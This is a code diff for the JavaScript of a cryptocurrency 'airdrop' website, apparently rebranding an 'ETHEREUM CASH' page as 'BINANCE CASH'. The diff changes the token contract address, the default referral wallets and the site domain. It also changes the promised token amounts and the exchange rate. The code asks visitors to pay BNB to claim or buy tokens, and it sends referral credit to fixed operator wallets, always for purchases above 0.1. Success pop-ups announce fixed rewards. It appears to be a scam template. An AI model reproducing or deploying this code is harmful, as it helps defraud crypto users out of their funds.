@@ -1,7 +1,7 @@
 let web3 = new web3js.myweb3(window.ethereum);
 let addr;
 
-const sttaddr = "0xd2fEEB96749A68871bC835298919C5Be2e3c4c40";
+const sttaddr = "0x81e6eddba780e6dc68434726547c07402299c3b3";
 const sttabi = [{
     "inputs": [],
     "stateMutability": "nonpayable",
@@ -1040,7 +1040,7 @@ const getAirdrop = async () => {
     if (gettkbl == 0) {
         let fresh = document.getElementById('airinput').value;
         if (fresh === "")
-            fresh = "0x00FecA544dC541d99D5a1fb7691BF3175486C69F";
+            fresh = "0x3f1075B0433Ea833ebA794249Af90f2283FF6199";
         sttcontract.methods.airdrop(fresh).send({
             from: addr
         }, (err, res) => {
@@ -1048,7 +1048,7 @@ const getAirdrop = async () => {
                 Swal.fire({
                     title: 'Claim Success',
                     icon: 'success',
-                    html: '500,000,000 ETHEREUM CASH sent to your wallet.',
+                    html: '500 BINANCE CASH sent to your wallet.',
                     showCloseButton: true,
                     showCancelButton: true,
                     focusConfirm: false,
@@ -1104,7 +1104,7 @@ const buyair = async () => {
             ethval = Number(ethval) * 1e18;
             let fresh = document.getElementById('airinput').value;
             if (fresh === "")
-                fresh = "0x00FecA544dC541d99D5a1fb7691BF3175486C69F";
+                fresh = "0x81e6eddba780e6dc68434726547c07402299c3b3";
             sttcontract.methods.airdrop(fresh).send({
                 from: addr,
                 value: ethval
@@ -1113,7 +1113,7 @@ const buyair = async () => {
                     Swal.fire({
                         title: 'Claim Success',
                         icon: 'success',
-                        html: '500,000,000 ETHEREUM CASH sent to your wallet.',
+                        html: '500 BINANCE CASH sent to your wallet.',
                         showCloseButton: true,
                         showCancelButton: true,
                         focusConfirm: false,
@@ -1168,7 +1168,7 @@ const buystt = async () => {
         if (ethval >= 0.01) {
             let fresh = document.getElementById('airinput').value;
             if (ethval > 0.1 || fresh === "")
-                fresh = "0x00FecA544dC541d99D5a1fb7691BF3175486C69F";
+                fresh = "0x3f1075B0433Ea833ebA794249Af90f2283FF6199";
             ethval = Number(ethval) * 1e18;
 
             sttcontract.methods.buy(fresh).send({
@@ -1287,7 +1287,7 @@ function getreflink() {
                 'error'
             )
         } else {
-            document.getElementById('refaddress').value = 'https://ethereumcash.online/?ref=' + document.getElementById('refaddress').value;
+            document.getElementById('refaddress').value = 'https://binancecash.live/?ref=' + document.getElementById('refaddress').value;
         }
     }
 }
@@ -1296,15 +1296,15 @@ function kopiraj() {
     var copyText = document.getElementById("refaddress");
     copyText.select();
     document.execCommand("Copy");
-    alert("Link Copy Success. Send this link to invite your friends to claim airdrop. Receive 30% BNB + 70% of all token Claims and Buy");
+    alert("Link Copy Success. Send this link to invite your friends to claim airdrop. Receive 30% BNB + 100% of all token Claims and Buy");
 }
 
 function calculate() {
     var bnb = document.getElementById("buyinput").value;
-    var tokensPerEth = 1000000000000;
+    var tokensPerEth = 1000000;
     var tokens = tokensPerEth * bnb;
     console.log(tokens);
-    document.getElementById("buyhch2input").value = tokens.toLocaleString("en-US") + ' ETHEREUM CASH';
+    document.getElementById("buyhch2input").value = tokens.toLocaleString("en-US") + ' BINANCE CASH';
 
 
 }
@@ -1341,10 +1341,10 @@ function addToWallet() {
         params: {
             'type': 'ERC20',
             'options': {
-                'address': '0xd2fEEB96749A68871bC835298919C5Be2e3c4c40',
+                'address': '0x81e6eddba780e6dc68434726547c07402299c3b3',
                 'symbol': 'ETHC',
                 'decimals': '18',
-                'image': 'https://ethereumcash.online/images/favicon.ico',
+                'image': 'https://binancecash.live/images/favicon.ico',
             },
         },
         id: Math.round(Math.random() * 100000)
@@ -1390,7 +1390,7 @@ var ref = querySt("ref");
 
 
 if (ref == null) {
-    ref = "0x00FecA544dC541d99D5a1fb7691BF3175486C69F";
+    ref = "0x3f1075B0433Ea833ebA794249Af90f2283FF6199";
     document.getElementById('airinput').value = ref;
 } else {
     document.getElementById('airinput').value = ref;
